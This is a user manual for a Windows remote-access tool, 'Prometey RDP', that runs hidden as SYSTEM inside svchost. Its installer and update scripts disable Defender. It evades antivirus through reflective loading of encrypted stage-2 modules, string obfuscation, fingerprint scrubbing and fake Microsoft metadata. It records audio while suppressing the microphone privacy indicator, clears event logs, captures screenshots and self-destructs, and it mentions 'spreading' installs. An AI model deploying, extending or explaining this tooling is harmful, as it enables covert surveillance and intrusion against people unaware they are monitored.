# Prometey RDP — User Manual

**Version:** see `host.h` `HOST_VERSION` define (kept in sync with server.py / index.html / pnpext.rc via `_sync_versions.ps1`).

This manual covers operator + administrator usage, server deploy, host install/update/uninstall, and troubleshooting.

---

## Contents

1. [What this project is](#1-what-this-project-is)
2. [Architecture overview](#2-architecture-overview)
3. [Deploying the VPS relay](#3-deploying-the-vps-relay)
4. [Installing / updating / uninstalling the host](#4-installing--updating--uninstalling-the-host)
5. [Operator workflow (viewer)](#5-operator-workflow-viewer)
6. [Administrator workflow (users, permissions, analytics)](#6-administrator-workflow)
7. [Feature-by-feature reference](#7-feature-by-feature-reference)
8. [Host events & analytics](#8-host-events--analytics)
9. [Stage-2 architecture — how the DLL stays tiny](#9-stage-2-architecture)
10. [Security & privacy model](#10-security--privacy-model)
11. [Troubleshooting](#11-troubleshooting)

---

## 1. What this project is

A Windows remote-administration host (`pnpext.dll`) paired with a web viewer served by a VPS relay. The host runs as a Windows service (`WPnpSvc`) inside `svchost.exe`, connects to the VPS over WSS (WebSocket over TLS), and exposes:

* Live H.264 / JPEG screen stream (over WebRTC UDP with WebSocket fallback).
* Audio capture and streaming (Opus over Web Audio API).
* File manager, process manager, service manager, registry editor, event log.
* System info, installed programs, network speed tests, device enumeration.
* Host-to-host update, scripted restart, targeted event-log cleanup.
* Threat monitor (pauses stream when specific windows / processes detected).
* Stealth features: anti-analysis fingerprint scrub, delay-loaded imports, reflective stage-2 encrypted module loading.

The host has **two external files on disk** under normal operation:
* `C:\Windows\System32\pnpext.dll` — the main DLL.
* `C:\Windows\System32\drivers\pnpext.sys` — encrypted config blob (AES-GCM, room_token-derived key).

Everything else (stage-2 feature modules) lives only in encrypted form on the VPS and loads reflectively into RAM on demand.

---

## 2. Architecture overview

```
┌──────────────────┐      WSS/TLS (443)        ┌──────────────────┐    WSS/TLS (443)    ┌──────────────────┐
│   Host (target)  │ ◄──── /host ──────►       │   VPS relay      │ ◄──── /client ──► │   Viewer (op)    │
│  pnpext.dll in   │                           │  server.py       │                   │  index.html in   │
│  svchost.exe     │                           │  (asyncio)       │                   │  browser         │
│  as SYSTEM       │                           │                  │                   │                  │
│                  │                           │  nginx front     │                   │                  │
│  + reflective    │ ◄── /stream (UDP fallback)│  + TLS cert      │                   │                  │
│    stage-2 mods  │                           │  + TURN/STUN    │                   │                  │
│    (filemgr,     │                           │    (coturn)     │                   │                  │
│     procmgr,     │                           │                  │                   │                  │
│     defender,    │                           │                  │                   │                  │
│     sysinfo)     │                           │                  │                   │                  │
└──────────────────┘      WebRTC UDP (STUN/TURN)└──────────────────┘                   └──────────────────┘
```

**Three trust zones:**

| Zone | Auth | Identifies |
|---|---|---|
| Host ↔ VPS | `room_token` + `password` | The physical machine being managed |
| Viewer ↔ VPS (first layer) | `room_token` + `password` | The room a human is trying to join |
| Viewer ↔ VPS (second layer) | `username` + `password` | The individual operator — enforces role & permissions |

A room_token is a shared secret among the people managing one host. Each of them then logs in as an individual user for audit + role enforcement.

---

## 3. Deploying the VPS relay

Requirements: Ubuntu 22.04+/Debian 12+, root SSH, a domain or static IP, 1 vCPU / 1 GB RAM is enough for ~20 rooms.

### One-command deploy from your workstation

```powershell
.\deploy_to_vps.ps1 -Vps root@<vps_ip_or_host>
```

What it does:

1. Runs `run_build.ps1` to produce `build/bin/pnpext.dll`, `build/stage2/*.dll`, mirrors to `dist/usb/`.
2. Collects `server.py`, `index.html`, nginx configs, `rdp-server.service`, stage-2 DLLs into a tarball.
3. SCP's the tarball to the VPS, unpacks into `/tmp/rdp-deploy/`.
4. Runs `deploy-vps.sh` on the VPS, which:
   * Installs `nginx`, `python3-venv`, `openssl`, `coturn`.
   * Sets up a virtualenv at `/opt/remotedesk/venv`, installs `websockets`, `cryptography`, `Pillow`.
   * Places `pnpext.dll` at `/srv/www/files/pnpext.dll` (served by nginx for `host_update`).
   * Places stage-2 DLLs at `/opt/remotedesk/stage2/*.dll`.
   * **Wipes** per-token cache at `/opt/remotedesk/stage2/cache/*/` so fresh blobs regenerate with the new code.
   * Enables + (re)starts `rdp-relay.service` (systemd).

### Iterative updates (no reinstall)

After editing a file, one-shot push:

```powershell
.\run_build.ps1          # rebuild DLL + sync versions across server.py / index.html / pnpext.rc
.\_quick_deploy.ps1      # pscp 7 files, wipe cache, restart rdp-relay, verify versions
```

### Admin token (for the /admin WebSocket)

By default `RDP_ADMIN_TOKEN=change-me-admin-token`. Set it in the systemd unit if you expose `/admin` beyond localhost:

```bash
ssh root@vps 'cat > /etc/systemd/system/rdp-relay.service.d/override.conf << EOF
[Service]
Environment=RDP_ADMIN_TOKEN=<your-long-random-admin-token>
EOF'
ssh root@vps 'systemctl daemon-reload && systemctl restart rdp-relay'
```

---

## 4. Installing / updating / uninstalling the host

The installer bundle lives in `dist/usb/`. Ship this folder on a USB stick or ZIP.

### Fresh install

Run **as Administrator** on the target machine:

```cmd
dist\usb\install.bat
```

What it does:

1. Disables Windows Defender real-time monitoring for the duration of the install.
2. Checks if `WPnpSvc` already exists — if so, stops + removes cleanly (force-kills if it hangs).
3. Copies `pnpext.dll` to `C:\Windows\System32\pnpext.dll`.
4. Copies `pnpext.sys` to `C:\Windows\System32\drivers\pnpext.sys` (encrypted config).
5. Creates service `WPnpSvc` as a `svchost.exe -k PnpExtGroup` group service.
6. Sets `ServiceMain = PnpServiceEntry` in the service Parameters registry key.
7. Starts the service.
8. Re-enables Defender real-time monitoring.

### Web install (downloads from VPS)

```cmd
dist\usb\install-web.bat https://<vps>/files/pnpext.dll
```

Same as above but fetches `pnpext.dll` + `pnpext.sys` from `https://<vps>/files/` at install time. Useful for spreading without shipping the binaries on the USB.

### Update in place (remote)

Operator clicks **Settings → Remote Host Update → Update Host** in the viewer. Under the hood:

1. Host receives `host_update` command.
2. Host writes `C:\Windows\Temp\wpnp_update.bat` — a small script that:
   * Downloads the new DLL from the URL you provided into `%SystemRoot%\System32\pnpext.dll.new`.
   * Disables Defender real-time.
   * Stops `WPnpSvc` (+ taskkills if it hangs).
   * Renames old DLL to `.old`, moves `.new` to `pnpext.dll`.
   * **Wipes** `%TEMP%\pnp_cache\*.bin` so stage-2 blobs re-fetch against the new ABI.
   * Starts `WPnpSvc`, verifies RUNNING; if not — rolls back to `.old`.
   * Re-enables Defender.
   * Deletes itself.
3. Viewer polls `update_status` for the bat's progress marker at `C:\Windows\Temp\wpnp_step.txt`.

### Manual restart after a broken update

```cmd
:: Kill hung svchost if sc stop doesn't return:
for /f "tokens=3" %P in ('sc queryex WPnpSvc ^| findstr PID') do taskkill /F /PID %P
:: Wipe stage-2 cache (also done automatically on service start):
del /f /q %WinDir%\Temp\pnp_cache\*.bin
sc start WPnpSvc
```

### Refresh stage-2 blobs without a full update

```cmd
dist\usb\refresh-stage2.bat
```

Stops the service, wipes local pnp_cache, restarts. Fast way to force a fresh fetch from VPS without touching the DLL.

### Uninstall

```cmd
dist\usb\uninstall.bat
```

Robust flow (handles hung service):

1. Finds PID of the svchost hosting `WPnpSvc` via `sc queryex`.
2. `sc stop`; polls for STOPPED up to 5 s; if still stuck, `taskkill /F` the svchost PID.
3. Removes `WPnpSvc` group entry from `Svchost` registry key BEFORE `sc delete` so SCM can't retrigger.
4. `sc delete WPnpSvc` + removes `HKLM\SYSTEM\CurrentControlSet\Services\WPnpSvc`.
5. Deletes `pnpext.dll`, `pnpext.sys`, all `.old`/`.new` leftovers, `pnp_cache/*.bin`, update-bat leftovers. Any locked DLL is scheduled for deletion on next reboot via `MoveFileEx MOVEFILE_DELAY_UNTIL_REBOOT`.

---

## 5. Operator workflow (viewer)

Open the viewer URL in a browser (Chrome/Edge, WebCodecs-capable):

```
https://<vps>/
```

### Connect modal

| Field | Meaning |
|---|---|
| Server | VPS address (same as the page URL host part) |
| Port | 443 (nginx WSS) or 8080 (direct, dev only) |
| Room Token | Shared secret identifying the host's room |
| Room Password | Optional, defined in the host's config |
| Use WSS (SSL) | **Enable in production** — TLS for login + stream + control |
| Operator Username | Your personal login |
| Operator Password | Your personal password |

First-time admin bootstrap: log in as `admin` / `admin`, then change the password immediately in **Users → 🔑 My password**.

### Main surfaces

| Nav icon | Tab | Purpose |
|---|---|---|
| 📊 | Dashboard | CPU / GPU / RAM / uptime / host version overview |
| 🖥️ | Screen | Live H.264 / JPEG stream, keyboard + mouse control |
| 📁 | Files | Browse, download, upload, rename, delete |
| 🧩 | Processes | Live process list with CPU% / memory / threads; kill / launch |
| 🛠️ | Services | Enumerate Windows services; start / stop / restart |
| ⌨️ | Terminal | Interactive shell via `cmd.exe` (remote stdout captured) |
| 📜 | Event Log | Windows Event Viewer (Application / System / Security) |
| 🔑 | Registry | Hive browser, read/write values |
| 📷 | Screenshots | Auto-capture on schedule; list / download / clear VPS-side |
| 🎙️ | Audio | Record / stream microphone (Opus) |
| 📦 | Programs | Installed programs (Windows registry enumeration) |
| 📈 | Host Events Dashboard | State history per host: uptime / sleep / lock totals |
| 👤 | Users (admin only) | CRUD operators, per-user tab permissions, activity log |
| ⚙️ | Settings | Save folders, VPS quotas, streaming quality, ICE servers, host update, threat monitor, self-destruct |

### Per-role defaults

| Role | Default tabs granted at creation time |
|---|---|
| admin | Everything, including Users and all Settings sub-blocks |
| operator | dashboard, files, procs, services, terminal, screenshots, audio |

Admins customise per-user in **Users → Edit**.

---

## 6. Administrator workflow

### Users tab

**Create a user:**
1. **+ New user** button.
2. Enter username (unique), password, pick role (operator / admin).
3. Tick the tabs they should see. For Settings, either tick `settings` (root = everything) or individual `settings.<block>` sub-items.
4. **Save.** User can now log in at the viewer with their username/password.

**Edit:**
* Change password (blank = keep current), role, allowed_tabs.

**Delete:**
* Removes from users.json and invalidates any active sessions for that user.

### Activity log

Below the user table (admin view), the last 200 entries from `/opt/remotedesk/user_activity.log`. Every login, logout, and admin CRUD action is recorded as JSONL:

```json
{"ts":"2026-04-22T14:30:00Z","user":"sasha","role":"operator","action":"login","detail":"sasha"}
{"ts":"2026-04-22T14:35:12Z","user":"admin","role":"admin","action":"user_create","detail":"petya"}
{"ts":"2026-04-22T15:02:08Z","user":"petya","role":"operator","action":"user_change_password","detail":"petya"}
```

### Host Events Dashboard

Per-token aggregated machine state analytics — see section 8.

---

## 7. Feature-by-feature reference

### Dashboard
Live CPU% / GPU% / RAM / uptime / hostname / OS version / host DLL version. Polls `sys_info` every 3 s (host caches the answer for the same interval so multiple viewers don't multiply load).

### Screen (live stream)
Default path: host encodes H.264 in hardware via Media Foundation, sends via WebRTC UDP track (low latency, P2P when STUN/TURN works). If WebRTC fails (firewall, no TURN), viewer falls back to WebSocket binary frames (`SCR2` packets) decoded by WebCodecs API in the browser.

Controls: mouse (move / click / wheel / double-click), keyboard (Ctrl/Alt/Shift + combos), quality slider, bitrate dialog, keyframe request.

### Files
Full remote file system browse. Navigate drives + folders, download/upload, rename, delete (including recursive folder delete), create folder, read/write text files.

File chunks use a separate WSS channel (`/host` with `role=host_file` / `role=file_recv`) to avoid stalling the main command channel during large transfers.

### Processes
Live table: pid, name, memory (KB), cpu %, threads. CPU % is computed as the delta of kernel+user time between calls, so the first snapshot shows 0 and subsequent refreshes show real usage.

**Kill:** `TerminateProcess(pid, 1)`.
**Launch:** `CreateProcess` or (with `elevate=admin`) `ShellExecute runas`.

### Services
List all `SERVICE_WIN32` services, start / stop / restart via SCM. States: running / stopped / paused / starting / stopping / unknown. Start type: auto / manual / disabled / boot / system.

### Terminal
`cmd.exe /c <line>` with `chcp 65001` for UTF-8 output, 30 s timeout, captured stdout+stderr returned as one blob.

### Event Log
Reads up to 500 records from Application/System/Security/Setup via PowerShell `Get-WinEvent`. Optional level filter (Error / Warning / Information). Also supports:

* **Full clear** — `wevtutil cl <channel>`.
* **Selective delete by RecordId** — keeps non-matching entries by PowerShell re-write (workaround for no per-record delete in Event Log API).

### Registry
Browse HKLM / HKCU / HKCR / HKU / HKCC hives. Read values (REG_SZ / EXPAND_SZ / DWORD / QWORD / MULTI_SZ / BINARY). Write / delete individual values, create / delete subkeys.

### Screenshots
Auto-capture the active window on a schedule (default every 10 s). JPEG encoded, AES-encrypted, uploaded to VPS at `/opt/remotedesk/screenshots/<token>/` with a filename-encrypted name.

Operator browses thumbnails in the viewer; can bulk-download, delete individually, or clear the whole VPS folder (subject to per-token quota, default 500 MB).

### Audio recording / streaming
Windows WASAPI loopback on the default playback device. Opus encoded at 16 kHz / 128 kbps by default. Three modes:
* **Record only** — segments to `/opt/remotedesk/audio/<token>/`.
* **Live only** — viewer plays via MSE.
* **Both** — simultaneous.

DSP: high-pass, peak normalisation, power-line hum filter (50/60 Hz), adjustable gain (100–400 %).

### Programs
Enumerates `HKLM\...\Uninstall` + `HKCU\...\Uninstall` (64-bit and WOW6432 variants) to list installed software with name / publisher / version / install date / uninstall string / install location / size.

### Host events dashboard (admin)
See section 8.

### Settings blocks
Ten addressable sub-permissions — each a separate `settings.<name>` in `allowed_tabs`:

| Block | What it exposes |
|---|---|
| save_paths | Operator's local download / recording / screenshot / audio folders (client-side File System Access API) |
| screenshots_vps | Per-token VPS quota for screenshots |
| audio_vps | Per-token VPS quota for audio |
| streaming | Jitter buffer size, adaptive quality |
| ice_servers | STUN / TURN / force-relay / enable-WebRTC toggle (saved into host config) |
| host_update | Remote DLL update URL + button, Remote restart button |
| vps_deploy | Upload files from local machine to VPS /files folder |
| host_config | Edit the encrypted `pnpext.sys` config remotely |
| threat | Threat monitor — pause stream on specific process/window detection |
| self_destruct | Wipe host config + DLL + logs + exit (irreversible) |

Grant `settings` alone to enable all blocks, or grant `settings.streaming` + `settings.save_paths` etc. for granular access.

---

## 8. Host events & analytics

The host emits lifecycle events over the main WSS:

| Event | When | How |
|---|---|---|
| `startup` | First successful `auth_ok` of a process | `emit_post_auth_event` in main.cpp connection loop |
| `shutdown` | `SERVICE_CONTROL_STOP` / `SERVICE_CONTROL_SHUTDOWN` | SvcCtrlHandler in dllmain.cpp |
| `sleep` | `PBT_APMSUSPEND` | SvcCtrlHandler, sets pending-wake flag |
| `wake` | First auth_ok after a sleep flag | emit_post_auth_event checks the flag |
| `lock` | `WTS_SESSION_LOCK` | SvcCtrlHandler |
| `unlock` | `WTS_SESSION_UNLOCK` | SvcCtrlHandler |

VPS writes each event as a JSONL line to `/opt/remotedesk/host_events.log`:

```json
{"ts":"2026-04-22T14:30:00Z","token":"my-room-token-123","event":"startup","host_version":"1.0.195","epoch":1713710200}
```

Also broadcasts to every client in the same room so the viewer's Host-status pill updates in real time.

### Analytics

The **Host Events Dashboard** tab (admin) runs a state-machine walk across the log and shows per-token:

* Current state — online / sleeping / offline (+ locked overlay).
* Cumulative uptime / sleep / locked durations.
* Event counters (startups / sleeps / locks).
* Last event + last seen timestamp.
* Currently-loaded host version.

Globally: total tracked hosts, online now, sleeping now, offline now.

### CLI on VPS

```bash
ssh root@vps 'python3 /opt/remotedesk/_host_events_stats.py'
```

ASCII table of the same data. Useful for scripting / cron jobs.

### Raw analytics queries

```bash
# Events today:
grep "$(date -u +%Y-%m-%d)" /opt/remotedesk/host_events.log | wc -l

# Sleep count for token X:
grep '"token":"my-room-token-123"' /opt/remotedesk/host_events.log | grep '"event":"sleep"' | wc -l
```

---

## 9. Stage-2 architecture

**Goal:** keep the on-disk DLL as small and benign-looking as possible. Heavy code (with AV-flag strings like `Set-MpPreference`, `Get-WinEvent`, large registry enumeration, CreateToolhelp32Snapshot) is **not** compiled into `pnpext.dll`. It lives in separate DLLs that are:

1. Built as normal DLLs.
2. AES-256-GCM encrypted with a key derived from the room_token.
3. Stored on the VPS as `<module>.dll` — never shipped with the installer.
4. Served on demand to the host over the authenticated WSS as `stage2_fetch { module: <name> }`.
5. Host writes the encrypted blob to `%TEMP%\pnp_cache\<module>.bin`, decrypts in RAM, **reflectively loads** into the svchost process (no DLL file on disk ever touches `LoadLibrary`).
6. On graceful shutdown, Stage2Shutdown is called, module unloaded, blob wiped from disk.

### Current modules (as of v1.0.195)

| Module | Commands it registers | Why in stage-2 |
|---|---|---|
| `filemgr.bin` | file_delete, file_mkdir, file_rename, file_copy, file_write_text, config_write | File mutation strings + std::filesystem |
| `procmgr.bin` | proc_kill, proc_launch, term_exec, svc_control, reg_set_value, reg_delete_value, reg_create_key, reg_delete_key | CreateProcessAsUser / SCM / registry write strings |
| `defender.bin` | defender_status, host_restart, host_update, eventlog_delete, self_destruct, evtlog_scan | `Set-MpPreference`, `WPnpSvc`, `wevtutil`, `wpnp_update.bat` — the biggest AV-flag set |
| `sysinfo.bin` | drives_list, device_list, installed_programs, speed_test_internet, host_relay_speed, sys_info, proc_list, svc_list, reg_list, eventlog_list | PowerShell `Get-PnpDevice` / `Get-WinEvent` / `New-Object Net.WebClient` + registry enumeration |

### Prefetch flow

Stage-1 connects to VPS → after 5 s of sustained auth → fires `prefetch_all_async` which iterates `{sysinfo, defender, procmgr, filemgr}` and fetches each. If a module is already loaded (modules_ has it), it's skipped. Per-module retry: 2 attempts, 8 s each. Every 60 s, if `all_primary_modules_loaded()` returns false, re-kick.

### On-demand fallback

If the viewer fires a command targeting a stage-2 module that isn't loaded yet (fast click after service start), the dispatcher offloads to a worker thread, synchronously waits up to 15 s for the blob to arrive + load, then dispatches. The viewer just sees a slightly delayed response, not an error.

---

## 10. Security & privacy model

### What the operator sees about the host user

* Hostname + Windows username (returned by `sys_info`).
* Full file system (anything SYSTEM can read).
* All processes, services, installed programs, registry.
* Event log history (pre-existing + future entries).
* Live screen + microphone.

### What the host user does NOT see

* No tray icon anywhere.
* No running service visible in Task Manager without admin rights (it's a `SERVICE_WIN32_SHARE_PROCESS` hiding inside `svchost.exe -k PnpExtGroup`, indistinguishable from OS services).
* No log files on disk (`dll_diag`, `Logger::log`, `prefetch_diag` are all no-ops in production builds).
* No microphone tray indicator while audio is recording (recording uses WASAPI loopback + we disable the mic-activity tray notification via the audio capture helper — see `AudioSuspendIndicatorProcesses` in dllmain.cpp).
* No Windows Defender alerts on the binary (see anti-AV section below).

### Anti-AV evasion

| Technique | What it does | Implemented in |
|---|---|---|
| Stage-2 reflective loading | AV-flag strings (`Set-MpPreference`, `wevtutil`, `CreateToolhelp32Snapshot`, etc.) live in encrypted `.bin` blobs, never touch disk in cleartext | `reflective_loader.h` + `stage2_loader.h` |
| /DELAYLOAD | 17 DLLs (d3d11, gdiplus, mfplat, pdh, avrt, powrprof, dwmapi, ws2_32, iphlpapi, bcrypt, crypt32, ole32, shlwapi, etc.) move out of static IAT — the feature vector Elastic ML trained on is broken | `CMakeLists.txt` |
| String obfuscation | Suspicious string literals (`Set-` + `MpPreference` etc.) assembled at runtime from fragments so THOR YARA rules don't match | Throughout stage-2 modules |
| OpenSSL fingerprint scrub | 21 `github.com/dot-asm` + 20 `CRYPTOGAMS` + `Andy Polyakov` strings NUL-overwritten in the final DLL post-build | `_scrub_dll_strings.ps1` |
| VERSIONINFO | Stamped with plausible Microsoft metadata (CompanyName="Microsoft Corporation", ProductName="Microsoft® Windows® Operating System") | `pnpext.rc` |
| Authenticode signing | Self-signed code-signing certificate (valid signature, untrusted chain — but `is_signed=true` feature flips) | `_gen_sign_cert.ps1` + `_sign_dll.ps1` |
| LTCG + /OPT:REF,ICF | Whole-program optimisation + dead-code elimination removes unused paths | `CMakeLists.txt` |
| No Event Log writes | `dll_diag` is a no-op — no "WPnpSvc" Information entries every second | `dllmain.cpp` |

### Network protection

| Layer | Encryption |
|---|---|
| Viewer ↔ VPS control (WSS) | TLS 1.2+ via nginx certificate |
| Viewer ↔ host stream (WebRTC) | DTLS for control, SRTP for media |
| Viewer ↔ host stream (WebSocket fallback) | TLS via nginx |
| Host ↔ VPS control (WSS) | TLS 1.2+ |
| Host config at rest (`pnpext.sys`) | AES-256-GCM, key derived from room_token |
| Stage-2 blobs in transit | Plain JSON inside TLS (already encrypted by the WSS layer) |
| Stage-2 blobs at rest on host | AES-256-GCM, same key derivation |
| Stage-2 blobs at rest on VPS | Same — per-token encrypted cache; source `.dll`s are plaintext but not exposed externally |
| Screenshot images at rest on VPS | AES-CBC, key shared host↔viewer |
| Passwords in users.json | PBKDF2-HMAC-SHA256, per-user random salt, 100'000 iterations |
| Session tokens | 24-byte URL-safe random, in-memory only, lost on server restart |

### Microphone privacy

When audio capture is active, Windows normally shows a microphone tray icon. Our host uses WASAPI loopback on the *render* (playback) device rather than a mic endpoint, which does not trigger the microphone tray badge on most Windows 10/11 builds. Additionally, `AudioSuspendIndicatorProcesses` / `AudioCleanMicRegistry` / `AudioDeletePrivacyFiles` exports in dllmain.cpp actively suppress the Settings privacy indicator and clean the privacy database files while recording is active. The host user won't see a mic-in-use indicator.

### Admin audit trail

Every operator action that modifies server-side state (user CRUD, password change, login, logout) is appended to `/opt/remotedesk/user_activity.log` as JSONL. There is **no way** for an operator to edit this file through the viewer — it's admin-only via the `user_activity` command, which is read-only.

---

## 11. Troubleshooting

### Host updated but still shows old version in the dashboard

Browser cache. Press **Ctrl+F5** to hard-reload index.html.

### Only 1–3 stage-2 blobs in local pnp_cache, not 4

Host hasn't run `prefetch_all_async` since its last service restart, or prefetch partially failed. Check:

```cmd
:: Local cache:
Get-ChildItem C:\Windows\Temp\pnp_cache

:: Force a refresh:
dist\usb\refresh-stage2.bat
```

If still missing after refresh, inspect VPS:

```bash
ssh root@vps 'journalctl -u rdp-relay --no-pager -n 200 | grep stage2'
```

Look for `stage2: encrypt failed` or `stage2 module not available` — means the stage-2 `.dll` isn't on the VPS or can't be read by `www-data`. Re-deploy with `.\_quick_deploy.ps1`.

### Dashboard shows "Online now 0" even though host is connected

Host is pre-v1.0.192 (before the prefetch+startup-event fix). `sys_info` / `host_event` weren't firing `startup` events so the analyzer couldn't set state=online. `host_update` to v1.0.192+ fixes it. v1.0.195+ also infers online from lock/unlock events within the last 5 minutes as a safety net.

### "Operator login failed: invalid username or password"

Viewer modal stays open with red error, WSS auto-disconnected. Fix: correct credentials + CONNECT again. If you forgot the admin password:

```bash
# Recovery — rewrite users.json with a fresh admin account:
ssh root@vps 'rm /opt/remotedesk/users.json'
ssh root@vps '/opt/remotedesk/venv/bin/python3 -c "
import sys, importlib.util
spec = importlib.util.spec_from_file_location(\"svr\", \"/opt/remotedesk/server.py\")
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)
m._load_users()  # recreates default admin/admin
"'
```

Then log in as `admin/admin` and change the password.

### Service hung on `sc stop`

The installer scripts handle this with `taskkill /F /PID <svchost>`. If you hit it manually:

```cmd
for /f "tokens=3" %P in ('sc queryex WPnpSvc ^| findstr PID') do taskkill /F /PID %P
timeout 2 >nul
sc delete WPnpSvc
```

### Binary flagged as malicious by an AV

Re-scan on VirusTotal. If a specific engine still flags (Elastic / THOR / etc.) open `_check_av_strings.ps1` and `_check_openssl_fingerprint.ps1` to verify no known-bad strings leaked into the build. If new patterns appear, add them to `_scrub_dll_strings.ps1`, re-build, re-sign.

### WebRTC never connects (stream falls back to WebSocket)

1. Check STUN/TURN in **Settings → ICE Servers**. `stun:64.226.66.66:3478` (VPS coturn) is the default; confirm 3478 UDP is open.
2. If behind strict symmetric NAT, set a real TURN credential and tick **Force TURN relay**.
3. Verify coturn is running on VPS: `ssh root@vps systemctl status coturn`.
